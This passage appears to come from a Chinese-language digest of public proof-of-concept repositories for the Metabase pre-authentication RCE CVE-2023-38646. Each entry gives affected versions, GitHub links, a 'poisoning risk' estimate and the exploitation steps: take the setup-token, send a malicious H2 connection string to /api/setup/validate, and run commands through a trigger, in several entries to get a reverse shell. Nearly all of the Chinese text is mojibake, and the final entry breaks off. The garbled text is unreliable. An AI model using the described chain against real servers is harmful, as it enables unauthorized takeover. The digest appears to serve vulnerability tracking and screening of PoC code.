2.  æ„é€ Payloadï¼šPOCæ„é€ ä¸€ä¸ªåŒ…å«æ¶æ„JDBC URLçš„JSON payloadã€‚è¯¥URLåˆ©ç”¨H2æ•°æ®åº“çš„`CREATE TRIGGER`åŠŸèƒ½æ¥æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚å‘½ä»¤çš„æ‰§è¡Œæ˜¯é€šè¿‡è°ƒç”¨`java.lang.Runtime.getRuntime().exec()`å®ç°çš„ã€‚POCä¸­é»˜è®¤æ‰§è¡Œ`touch /tmp/success`ï¼Œè¿™æ˜¯ä¸€ä¸ªæ— å®³çš„å‘½ä»¤ï¼Œç”¨äºéªŒè¯æ¼æ´çš„å­˜åœ¨ã€‚
3.  å‘é€Payloadï¼šPOCå°†æ„é€ çš„payloadå‘é€åˆ°`/api/setup/validate`ç«¯ç‚¹ã€‚å¦‚æœæœåŠ¡å™¨è¿”å›åŒ…å«"Error creating or initializing trigger"çš„å“åº”ï¼Œåˆ™è¡¨æ˜æ¼æ´åˆ©ç”¨æˆåŠŸã€‚

**æŠ•æ¯’é£é™©:**
è™½ç„¶POCçš„ä¸»è¦åŠŸèƒ½æ˜¯åˆ©ç”¨æ¼æ´ï¼Œä½†å­˜åœ¨ä¸€äº›æ½œåœ¨çš„æŠ•æ¯’é£é™©ã€‚ä»¥ä¸‹æ˜¯åˆ†æï¼š
1. **`custom_base64_encode`å‡½æ•°:** è¿™ä¸ªå‡½æ•°å­˜åœ¨è¢«æ»¥ç”¨çš„å¯èƒ½ã€‚è™½ç„¶å…¶ç›®çš„æ˜¯å¯¹å‘½ä»¤è¿›è¡Œç¼–ç ï¼Œä½†å¦‚æœç”¨äºç¼–ç æ¶æ„è„šæœ¬å¹¶æ‰§è¡Œï¼Œåˆ™ä¼šäº§ç”Ÿå®‰å…¨é—®é¢˜ã€‚
2. **å‘½ä»¤æ‰§è¡Œ:** POCä¸­ä½¿ç”¨`java.lang.Runtime.getRuntime().exec()`æ‰§è¡Œå‘½ä»¤ã€‚è¿™æœ¬èº«å°±å¾ˆå±é™©ï¼Œå› ä¸ºæ”»å‡»è€…å¯ä»¥æ‰§è¡Œä»»ä½•å‘½ä»¤ï¼ŒåŒ…æ‹¬ä¸‹è½½å’Œæ‰§è¡Œæ¶æ„è„šæœ¬ã€‚
3. **é»˜è®¤å‘½ä»¤:** è™½ç„¶POCé»˜è®¤æ‰§è¡Œçš„æ˜¯`touch /tmp/success`ï¼Œä½†æ”»å‡»è€…å¯ä»¥å¾ˆå®¹æ˜“åœ°ä¿®æ”¹`-c`å‚æ•°æ¥æ‰§è¡Œä»»ä½•å…¶ä»–å‘½ä»¤ã€‚å¦‚æœPOCè¢«åˆ†å‘å¹¶è¢«ç¼ºä¹ç»éªŒçš„ç”¨æˆ·ä½¿ç”¨ï¼Œä»–ä»¬å¯èƒ½ä¼šç›´æ¥æ‰§è¡Œæ”»å‡»è€…æä¾›çš„æ¶æ„å‘½ä»¤ã€‚

ç»¼åˆæ¥çœ‹ï¼ŒæŠ•æ¯’é£é™©ä¸»è¦åœ¨äºä½¿ç”¨è€…å¯èƒ½å—åˆ°æ¶æ„å‘½ä»¤çš„å½±å“ã€‚`custom_base64_encode`å‡½æ•°å’Œå‘½ä»¤æ‰§è¡Œæœºåˆ¶ä¹Ÿä¸ºæ½œåœ¨çš„æ¶æ„è¡Œä¸ºæä¾›äº†å¯èƒ½æ€§ã€‚é£é™©è¯„ä¼°ä¸º 10%ï¼Œä¸»è¦æ¥æºäºä½¿ç”¨è€…æ²¡æœ‰å®‰å…¨æ„è¯†ï¼Œç›´æ¥æ‰§è¡Œäº†æ¶æ„å‘½ä»¤ï¼Œæˆ–è€…ä»£ç åº“çš„ä¸‹è½½æºè¢«æ›¿æ¢ã€‚

**åˆ©ç”¨æ–¹å¼:**
1.  æ”»å‡»è€…é¦–å…ˆå‘`/api/session/properties`å‘é€GETè¯·æ±‚ä»¥è·å–setup-tokenã€‚
2.  ç„¶åï¼Œæ”»å‡»è€…æ„é€ ä¸€ä¸ªåŒ…å«æ¶æ„JDBC URLçš„JSON payloadã€‚æ¶æ„JDBC URLåˆ©ç”¨H2æ•°æ®åº“çš„`CREATE TRIGGER`åŠŸèƒ½æ¥æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚å…·ä½“æ¥è¯´ï¼Œå®ƒåˆ›å»ºä¸€ä¸ªåœ¨`INFORMATION_SCHEMA.TABLES`ä¸Šè§¦å‘çš„triggerï¼Œå¹¶åœ¨è§¦å‘æ—¶æ‰§è¡ŒJavaä»£ç ã€‚Javaä»£ç è°ƒç”¨`java.lang.Runtime.getRuntime().exec()`æ¥æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚
3.  æ”»å‡»è€…å°†æ„é€ çš„payloadå‘é€åˆ°`/api/setup/validate`ç«¯ç‚¹ã€‚
4.  å¦‚æœæœåŠ¡å™¨æˆåŠŸåˆ›å»ºäº†triggerï¼Œåˆ™æ”»å‡»æˆåŠŸï¼Œæ”»å‡»è€…æ‰§è¡Œçš„å‘½ä»¤å°†åœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œã€‚

**é¡¹ç›®åœ°å€:** [CN016/Metabase-H2-CVE-2023-38646-](https://github.com/CN016/Metabase-H2-CVE-2023-38646-)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #6

**æ¥æº**: [CVE-2023-38646-DaniTheHack3r_CVE-2023-38646.md](../2023/CVE-2023-38646-DaniTheHack3r_CVE-2023-38646.md)

## CVE-2023-38646 Metabase RCE

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ (RCE)

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œæœªç»èº«ä»½éªŒè¯å³å¯æ‰§è¡Œä»»æ„å‘½ä»¤

**å½±å“ç‰ˆæœ¬:** Metabase open source < 0.46.6.1 å’Œ Metabase Enterprise < 1.46.6.1

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡Metabaseå®ä¾‹å¯ç½‘ç»œè®¿é—®ï¼Œä¸”ç‰ˆæœ¬åœ¨å—å½±å“èŒƒå›´å†…

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2023-38646 å…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…åœ¨ Metabase æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚æ ¹æ®æ¼æ´åº“ä¿¡æ¯å’Œæœç´¢å¼•æ“ç»“æœï¼Œæ­¤æ¼æ´çš„ä¸¥é‡ç¨‹åº¦ä¸ºé«˜å±ï¼Œå› ä¸ºæ”»å‡»è€…å¯ä»¥å®Œå…¨æ§åˆ¶å—å½±å“çš„æœåŠ¡å™¨ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**

1.  **è·å– Token:** POCä»£ç é¦–å…ˆå°è¯•ä» `[TARGET_URL]/api/session/properties` è·å– setup-tokenã€‚
2.  **æ„é€  Payload:** åˆ©ç”¨è·å–åˆ°çš„tokenï¼ŒPOCæ„é€ ä¸€ä¸ªåŒ…å«æ¶æ„æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²çš„ payloadã€‚è¯¥å­—ç¬¦ä¸²ä¸­åŒ…å«å¯æ‰§è¡Œå‘½ä»¤ï¼ˆé€šè¿‡ `COMMAND` å‚æ•°ä¼ å…¥ï¼‰ï¼Œé€šå¸¸é€šè¿‡ Base64 ç¼–ç è¿›è¡Œæ··æ·†ã€‚
3.  **å‘é€ Payload:** æ„é€ å¥½çš„payloadä¼šè¢«å‘é€åˆ° Metabase æœåŠ¡å™¨ï¼Œåˆ©ç”¨å…¶å¯¹æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²å¤„ç†ä¸å½“çš„æ¼æ´ï¼Œæ‰§è¡Œæ”»å‡»è€…æŒ‡å®šçš„å‘½ä»¤ã€‚
4.  **å‘½ä»¤æ‰§è¡Œ:**  é€šè¿‡åˆ›å»ºè§¦å‘å™¨å’Œåˆ©ç”¨H2æ•°æ®åº“ç‰¹æ€§ï¼Œå®ç°åœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚

**æœ‰æ•ˆæ€§è¯„ä¼°ï¼š**

æ ¹æ®æ¼æ´æè¿°ã€æœç´¢å¼•æ“ç»“æœï¼ˆä¾‹å¦‚ï¼Œ[https://www.assetnote.io/resources/research/chaining-our-way-to-pre-auth-rce-in-metabase-cve-2023-38646/](https://www.assetnote.io/resources/research/chaining-our-way-to-pre-auth-rce-in-metabase-cve-2023-38646/) ï¼‰å’ŒPOCä»£ç ï¼Œæ­¤æ¼æ´åˆ©ç”¨çš„æœ‰æ•ˆæ€§è¾ƒé«˜ã€‚å¤šä¸ªæ¥æºè¡¨æ˜ï¼Œè¯¥æ¼æ´å…è®¸æœªç»èº«ä»½éªŒè¯çš„è¿œç¨‹ä»£ç æ‰§è¡Œã€‚

**æŠ•æ¯’é£é™©è¯„ä¼°ï¼š**

POCä»£ç ä¸­å­˜åœ¨ä¸€å®šçš„æŠ•æ¯’é£é™©ã€‚è™½ç„¶ä¸»è¦åŠŸèƒ½æ˜¯åˆ©ç”¨æ¼æ´æ‰§è¡Œå‘½ä»¤ï¼Œä½†ä»£ç ä¸­å­˜åœ¨ä»¥ä¸‹æ½œåœ¨çš„é£é™©ç‚¹ï¼š

*   **è‡ªå®šä¹‰ Base64 ç¼–ç :**  `CustomBase64Encode` å‡½æ•°ä½¿ç”¨è‡ªå®šä¹‰çš„ Base64 ç¼–ç æ–¹å¼ï¼Œè™½ç„¶ç›®çš„æ˜¯ä¸ºäº†ç¬¦åˆæ¼æ´åˆ©ç”¨çš„è¦æ±‚ï¼Œä½†ä¹Ÿå¯èƒ½è¢«ç”¨æ¥éšè—æ¶æ„ä»£ç ã€‚
*   **Payload æ„é€ :** Payloadçš„æ„é€ è¿‡ç¨‹æ¯”è¾ƒå¤æ‚ï¼Œæ”»å‡»è€…å¯èƒ½åœ¨payloadä¸­åµŒå…¥é¢å¤–çš„æ¶æ„ä»£ç ï¼Œä¾‹å¦‚ï¼Œåœ¨è¿æ¥å­—ç¬¦ä¸²ä¸­æ·»åŠ é¢å¤–çš„å‚æ•°ï¼Œä»¥ä¾¿åœ¨ç›®æ ‡æœåŠ¡å™¨ä¸Šæ‰§è¡Œå…¶ä»–æ¶æ„æ“ä½œã€‚
*   **ä»£ç†è®¾ç½®:** æ¶æ„æ”»å‡»è€…å¯èƒ½ä¼šé€šè¿‡ä»£ç†æœåŠ¡å™¨å‘èµ·æ”»å‡», ä»è€Œéšè—è‡ªå·±çš„èº«ä»½ä¿¡æ¯.

å°½ç®¡å¦‚æ­¤ï¼Œæ ¹æ®ä»£ç æœ¬èº«ï¼Œå¤§éƒ¨åˆ†ä»£ç æ˜¯ç”¨äºå®ç°æ¼æ´åˆ©ç”¨åŠŸèƒ½çš„ï¼ŒæŠ•æ¯’çš„å¯èƒ½æ€§ç›¸å¯¹è¾ƒä½ï¼Œä¼°è®¡åœ¨10%å·¦å³ã€‚éœ€è¦äººå·¥å®¡æ ¸Payloadæ„é€ éƒ¨åˆ†ã€‚


**é¡¹ç›®åœ°å€:** [DaniTheHack3r/CVE-2023-38646](https://github.com/DaniTheHack3r/CVE-2023-38646)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #7

**æ¥æº**: [CVE-2023-38646-Ego1stoo_CVE-2023-38646.md](../2023/CVE-2023-38646-Ego1stoo_CVE-2023-38646.md)

## CVE-2023-38646 Metabase Pre-Auth RCE

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œæœªç»èº«ä»½éªŒè¯çš„è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“ç‰ˆæœ¬:** Metabase open source before 0.46.6.1 å’Œ Metabase Enterprise before 1.46.6.1

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡ Metabase å®ä¾‹éœ€è¦è¿è¡Œåœ¨å—å½±å“çš„ç‰ˆæœ¬èŒƒå›´å†…ï¼Œå¹¶ä¸”æ”»å‡»è€…èƒ½å¤Ÿé€šè¿‡ç½‘ç»œè®¿é—®åˆ°è¯¥å®ä¾‹ã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2023-38646 å…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…åœ¨ Metabase æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚æ¼æ´çš„åˆ©ç”¨æ–¹å¼å¦‚ä¸‹ï¼š

1.  **æ¼æ´åŸç†ï¼š** Metabase å­˜åœ¨ä¸€ä¸ªæœªæˆæƒçš„ `/api/setup/validate` æ¥å£ï¼Œè¯¥æ¥å£ç”¨äºåœ¨ Metabase é¦–æ¬¡è®¾ç½®æ—¶éªŒè¯æ•°æ®åº“è¿æ¥ã€‚æ”»å‡»è€…å¯ä»¥åˆ©ç”¨æ­¤æ¥å£ï¼Œé€šè¿‡æ„é€ æ¶æ„çš„ H2 æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²ï¼Œåœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„ä»£ç ã€‚
2.  **åˆ©ç”¨æ­¥éª¤ï¼š**
    *   é¦–å…ˆï¼Œæ”»å‡»è€…è®¿é—® Metabase å®ä¾‹çš„æ ¹è·¯å¾„ï¼Œè·å– `setup-token`ã€‚è¿™ä¸ªtokenè¢«åµŒå…¥åœ¨HTMLå“åº”çš„JavaScriptä»£ç ä¸­ï¼Œç”¨äºåç»­çš„è®¾ç½®è¿‡ç¨‹ã€‚
    *   ç„¶åï¼Œæ”»å‡»è€…å‘ `/api/setup/validate` æ¥å£å‘é€ POST è¯·æ±‚ï¼Œè¯·æ±‚ä½“åŒ…å«ä¸€ä¸ªæ¶æ„çš„ JSON å¯¹è±¡ã€‚è¿™ä¸ª JSON å¯¹è±¡çš„ `details.details.db` å­—æ®µåŒ…å«ä¸€ä¸ªç‰¹åˆ¶çš„ H2 æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²ã€‚è¿™ä¸ªè¿æ¥å­—ç¬¦ä¸²ä¸­åµŒå…¥äº†æ¶æ„ä»£ç ï¼Œåˆ©ç”¨ H2 æ•°æ®åº“çš„ `TRACE_LEVEL_SYSTEM_OUT` å’Œ `CREATE TRIGGER` åŠŸèƒ½æ¥æ‰§è¡Œä»»æ„çš„ shell å‘½ä»¤ã€‚
    *   POCä»£ç æ„é€ äº†ä¸€ä¸ªåå¼¹shellçš„payloadï¼Œå°†ç›®æ ‡æœºå™¨ä¸Šçš„è¾“å…¥è¾“å‡ºé‡å®šå‘åˆ°æ”»å‡»è€…æ§åˆ¶çš„æœºå™¨ä¸Šï¼Œä»è€Œå®ç°è¿œç¨‹ä»£ç æ‰§è¡Œã€‚
3.  **æŠ•æ¯’é£é™©åˆ†æï¼š**
    è™½ç„¶æä¾›çš„ä»£ç ä¸»è¦æ˜¯ç”¨äºæ¼æ´åˆ©ç”¨ï¼Œä½†ä»å­˜åœ¨è½»å¾®çš„æŠ•æ¯’é£é™©ã€‚é£é™©ç‚¹ä¸»è¦å­˜åœ¨äº`CVE-2023-38646.py`è„šæœ¬ä¸­çš„`payload`å˜é‡ã€‚å½“å‰çš„`payload`ç”¨äºåˆ›å»ºä¸€ä¸ªåå‘shellè¿æ¥ï¼Œè™½ç„¶æœ¬èº«ä¸æ˜¯æ¶æ„ä»£ç ï¼Œä½†å¯èƒ½è¢«ä¿®æ”¹ä¸ºæ‰§è¡Œæ›´å…·ç ´åæ€§çš„æ“ä½œã€‚å¦å¤–ï¼Œä½œè€…æä¾›çš„githubé“¾æ¥ä¸­çš„å›¾ç‰‡å¯èƒ½æ˜¯ç»è¿‡ä¿®æ”¹çš„ã€‚
    æ€»ä½“è€Œè¨€ï¼ŒæŠ•æ¯’é£é™©è¾ƒä½ï¼Œä½†éœ€è¦ä»”ç»†å®¡æŸ¥ä»£ç ï¼Œç¡®ä¿å…¶æ²¡æœ‰è¢«ç¯¡æ”¹æˆ–æ·»åŠ æ¶æ„åŠŸèƒ½ã€‚


**é¡¹ç›®åœ°å€:** [Ego1stoo/CVE-2023-38646](https://github.com/Ego1stoo/CVE-2023-38646)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #8

**æ¥æº**: [CVE-2023-38646-JayRyz_CVE-2023-38646-PoC-Metabase.md](../2023/CVE-2023-38646-JayRyz_CVE-2023-38646-PoC-Metabase.md)

## CVE-2023-38646-Metabase-RCE

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ(RCE)

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œæœªç»èº«ä»½éªŒè¯çš„è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“ç‰ˆæœ¬:** Metabase open source < 0.46.6.1 å’Œ Metabase Enterprise < 1.46.6.1

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡Metabaseå®ä¾‹è¿è¡Œåœ¨å—å½±å“ç‰ˆæœ¬ï¼Œä¸”ç½‘ç»œå¯è¾¾ã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2023-38646 æ¼æ´å…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…åœ¨MetabaseæœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚æ ¹æ®æ¼æ´åº“ä¿¡æ¯å’Œæœç´¢å¼•æ“ç»“æœï¼Œæ­¤æ¼æ´å½±å“Metabaseå¼€æºç‰ˆæœ¬ä½äº0.46.6.1å’ŒMetabaseä¼ä¸šç‰ˆæœ¬ä½äº1.46.6.1ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**

1.  **è·å–Setup Tokenï¼š** åˆ©ç”¨ PoC ä»£ç ä¸­çš„ `get_token` å‡½æ•°ï¼Œé€šè¿‡è®¿é—® `/api/session/properties` æ¥å£è·å– setup-tokenã€‚
2.  **æ„é€ æ¶æ„Payloadï¼š** åˆ©ç”¨è·å–çš„ setup-token, æ„é€ åŒ…å«æ¶æ„å‘½ä»¤çš„payloadã€‚PoC ä»£ç ä½¿ç”¨ H2 æ•°æ®åº“çš„ç‰¹æ€§ï¼Œåœ¨æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²ä¸­åµŒå…¥æ¶æ„ SQL è¯­å¥ï¼Œè¯¥è¯­å¥åˆ›å»ºä¸€ä¸ªè§¦å‘å™¨ï¼ˆTRIGGERï¼‰ï¼Œåœ¨è§¦å‘å™¨ä¸­æ‰§è¡Œå‘½ä»¤ã€‚å‘½ä»¤ä½¿ç”¨äº†åå¼¹shellçš„æŠ€æœ¯ã€‚ é¦–å…ˆå°†è¦æ‰§è¡Œçš„shellå‘½ä»¤è¿›è¡Œbase64ç¼–ç , ç„¶ååˆ©ç”¨`java.lang.Runtime.getRuntime().exec()` æ¥æ‰§è¡Œå‘½ä»¤ã€‚
3.  **å‘é€Exploitï¼š** é€šè¿‡ POST è¯·æ±‚å°†æ„é€ çš„ payload å‘é€åˆ° Metabase æœåŠ¡å™¨ã€‚
4.  **åå¼¹ Shellï¼š** æ”»å‡»è€…ä½¿ç”¨ `nc` ç›‘å¬æŒ‡å®šç«¯å£ï¼Œç­‰å¾…ç›®æ ‡æœåŠ¡å™¨æ‰§è¡Œå‘½ä»¤ååå¼¹ shellã€‚

**æœ‰æ•ˆæ€§ï¼š**

æ ¹æ®æä¾›çš„æ¼æ´ä¿¡æ¯å’ŒPoCä»£ç ï¼Œæ­¤æ¼æ´çš„åˆ©ç”¨æ˜¯æœ‰æ•ˆçš„ã€‚æ¼æ´åº“ä¿¡æ¯æ˜ç¡®æŒ‡å‡ºæ— éœ€èº«ä»½éªŒè¯å³å¯åˆ©ç”¨æ­¤æ¼æ´æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚æœç´¢å¼•æ“ç»“æœä¸­ä¹ŸåŒ…å«å¤§é‡å…³äºæ­¤æ¼æ´çš„åˆ†æå’Œåˆ©ç”¨æ–‡ç« ï¼Œè¿›ä¸€æ­¥éªŒè¯äº†å…¶æœ‰æ•ˆæ€§ã€‚PoCä»£ç æä¾›äº†è‡ªåŠ¨åŒ–åˆ©ç”¨çš„è„šæœ¬ã€‚

**æŠ•æ¯’é£é™©ï¼š**

æä¾›çš„ PoC ä»£ç ä¸­å­˜åœ¨æ½œåœ¨çš„æŠ•æ¯’é£é™©ã€‚è™½ç„¶ä¸»è¦åŠŸèƒ½æ˜¯åˆ©ç”¨æ¼æ´ï¼Œä½†ä»£ç ä¸­å¯èƒ½åŒ…å«ä»¥ä¸‹æ½œåœ¨é£é™©ï¼š

*   **åå¼¹ Shell åœ°å€ï¼š** PoC ä»£ç å…è®¸ç”¨æˆ·æŒ‡å®šåå¼¹ shell çš„ IP åœ°å€å’Œç«¯å£ï¼Œä½†å¦‚æœç”¨æˆ·ä¸å°å¿ƒä½¿ç”¨äº†æ”»å‡»è€…æ§åˆ¶çš„ IP åœ°å€å’Œç«¯å£ï¼Œå¯èƒ½ä¼šè¢«åå¼¹ shellï¼Œå¯¼è‡´è‡ªèº«ç³»ç»Ÿè¢«æ”»å‡»è€…æ§åˆ¶ã€‚
*   **å…¶ä»–æ¶æ„å‘½ä»¤ï¼š**  æ”»å‡»è€…å¯èƒ½ä¼šä¿®æ”¹ PoC ä»£ç ï¼Œæ·»åŠ é¢å¤–çš„æ¶æ„å‘½ä»¤ï¼Œä¾‹å¦‚åˆ é™¤æ–‡ä»¶ã€ä¿®æ”¹ç³»ç»Ÿé…ç½®ç­‰ã€‚ä»£ç ä¸­çš„`convert_command`å‡½æ•°å’Œ`create_payload`å‡½æ•°å¯ä»¥è¢«ä¿®æ”¹æ³¨å…¥æ¶æ„ä»£ç ã€‚
*   **ä¾èµ–é¡¹é£é™©ï¼š** è™½ç„¶PoCä»£ç ä¾èµ–çš„requestsåº“æœ¬èº«é£é™©è¾ƒä½ï¼Œä½†æ˜¯å¦‚æœæ”»å‡»è€…æä¾›ä¿®æ”¹è¿‡çš„poc,å¢åŠ å…¶ä»–æ¶æ„ä¾èµ–åº“, å¯èƒ½ä¼šå­˜åœ¨å®‰å…¨é£é™©ã€‚

ç»¼åˆåˆ†æï¼ŒæŠ•æ¯’é£é™©è¯„ä¼°ä¸º 10%ï¼Œä¸»è¦é£é™©é›†ä¸­åœ¨ç”¨æˆ·é”™è¯¯ä½¿ç”¨æˆ–æ¶æ„ä¿®æ”¹ PoC ä»£ç çš„å¯èƒ½æ€§ä¸Šã€‚

**é¡¹ç›®åœ°å€:** [JayRyz/CVE-2023-38646-PoC-Metabase](https://github.com/JayRyz/CVE-2023-38646-PoC-Metabase)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #9

**æ¥æº**: [CVE-2023-38646-Mrunalkaran_CVE-2023-38646.md](../2023/CVE-2023-38646-Mrunalkaran_CVE-2023-38646.md)

## CVE-2023-38646-Metabase-RCE

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ(RCE)

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…ä»¥æœåŠ¡å™¨æƒé™æ‰§è¡Œä»»æ„å‘½ä»¤

**å½±å“ç‰ˆæœ¬:** Metabase open source versions before 0.46.6.1 and Metabase Enterprise versions before 1.46.6.1

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡Metabaseå®ä¾‹è¿è¡Œåœ¨å—å½±å“çš„ç‰ˆæœ¬ï¼Œä¸”ç½‘ç»œå¯è¾¾ã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 1%

## è¯¦æƒ…

CVE-2023-38646æ˜¯ä¸€ä¸ªå­˜åœ¨äºMetabase 0.46.6.1ä¹‹å‰ç‰ˆæœ¬å’ŒMetabase Enterprise 1.46.6.1ä¹‹å‰ç‰ˆæœ¬çš„è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ã€‚æ”»å‡»è€…æ— éœ€èº«ä»½éªŒè¯å³å¯åˆ©ç”¨æ­¤æ¼æ´ï¼Œé€šè¿‡ç²¾å¿ƒæ„é€ çš„è¯·æ±‚ï¼Œåœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ï¼Œä»è€Œå®Œå…¨æ§åˆ¶ç³»ç»Ÿã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**

1.  **è·å–Setup Token:** POCè„šæœ¬é¦–å…ˆå°è¯•ä»`/api/session/properties`ç«¯ç‚¹è·å–setup-tokenï¼Œè¿™ä¸ªtokenç”¨äºåç»­çš„åˆ©ç”¨ã€‚
2.  **æ„é€ æ¶æ„Payload:**  è„šæœ¬æ„é€ ä¸€ä¸ªåŒ…å«æ¶æ„H2æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²çš„JSON payloadã€‚è¯¥è¿æ¥å­—ç¬¦ä¸²åˆ©ç”¨H2æ•°æ®åº“çš„ç‰¹æ€§ï¼Œåœ¨è¿æ¥æ—¶æ‰§è¡Œä»»æ„Javaä»£ç ã€‚å…·ä½“æ¥è¯´ï¼Œå®ƒåˆ›å»ºäº†ä¸€ä¸ªè§¦å‘å™¨ï¼Œåœ¨è®¿é—® `INFORMATION_SCHEMA.TABLES` è¡¨æ—¶æ‰§è¡Œä¸€æ®µ JavaScript ä»£ç ã€‚
3.  **æ‰§è¡Œå‘½ä»¤:**  JavaScript ä»£ç è°ƒç”¨ `java.lang.Runtime.getRuntime().exec()` æ¥æ‰§è¡Œä¸€ä¸ªåŒ…å«base64ç¼–ç çš„bashå‘½ä»¤ã€‚æ­¤å‘½ä»¤è§£ç å¹¶æ‰§è¡Œåå‘shellå‘½ä»¤ã€‚
4.  **å‘é€Payload:**  æ„é€ å¥½çš„payloadé€šè¿‡POSTè¯·æ±‚å‘é€åˆ°`/api/setup/validate`ç«¯ç‚¹ã€‚
5.  **åå‘Shell:**  å¦‚æœæ¼æ´åˆ©ç”¨æˆåŠŸï¼Œæ”»å‡»è€…å°†åœ¨æŒ‡å®šçš„IPåœ°å€å’Œç«¯å£ä¸Šè·å¾—ä¸€ä¸ªåå‘shellã€‚

**æŠ•æ¯’é£é™©åˆ†æï¼š**

æä¾›çš„ä»£ç ä¸»è¦æ˜¯åˆ©ç”¨æ¼æ´è·å–åå‘shellã€‚é€šè¿‡æ£€æŸ¥ä»£ç ï¼Œæ²¡æœ‰å‘ç°æ˜æ˜¾çš„æ¶æ„ä»£ç ï¼Œä¾‹å¦‚åˆ é™¤æ–‡ä»¶ã€ä¼ æ’­æ¶æ„è½¯ä»¶ç­‰ã€‚ä»£ç ç»“æ„æ¸…æ™°ï¼Œç›®çš„æ˜¯åˆ©ç”¨æ¼æ´ã€‚è™½ç„¶ä»£ç æœ¬èº«æ˜¯ä¸ºäº†æ”»å‡»ï¼Œä½†å®ƒæ²¡æœ‰ä¸»åŠ¨è¿›è¡Œæ¶æ„ä¼ æ’­æˆ–å…¶ä»–ç ´åè¡Œä¸ºã€‚è€ƒè™‘åˆ°ä»£ç çš„åŠŸèƒ½ä¸»è¦æ˜¯æ¼æ´åˆ©ç”¨ï¼Œè€Œéæ¤å…¥åé—¨æˆ–è¿›è¡Œå…¶ä»–æ¶æ„æ´»åŠ¨ï¼Œå› æ­¤åˆ¤å®šå­˜åœ¨æŠ•æ¯’ä»£ç çš„å¯èƒ½æ€§è¾ƒä½ã€‚

è¯¥é¡¹ç›®ä¸­å¯èƒ½å­˜åœ¨æŠ•æ¯’çš„é£é™©è¾ƒä½ï¼Œè¯„ä¼°ç»“æœä¸º1%ã€‚

**é¡¹ç›®åœ°å€:** [Mrunalkaran/CVE-2023-38646](https://github.com/Mrunalkaran/CVE-2023-38646)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #10

**æ¥æº**: [CVE-2023-38646-Pyr0sec_CVE-2023-38646.md](../2023/CVE-2023-38646-Pyr0sec_CVE-2023-38646.md)

## CVE-2023-38646-Metabase-RCE

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ (RCE)

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…åœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤

**å½±å“ç‰ˆæœ¬:** < 0.46.6.1 (Open Source) å’Œ < 1.46.6.1 (Enterprise)

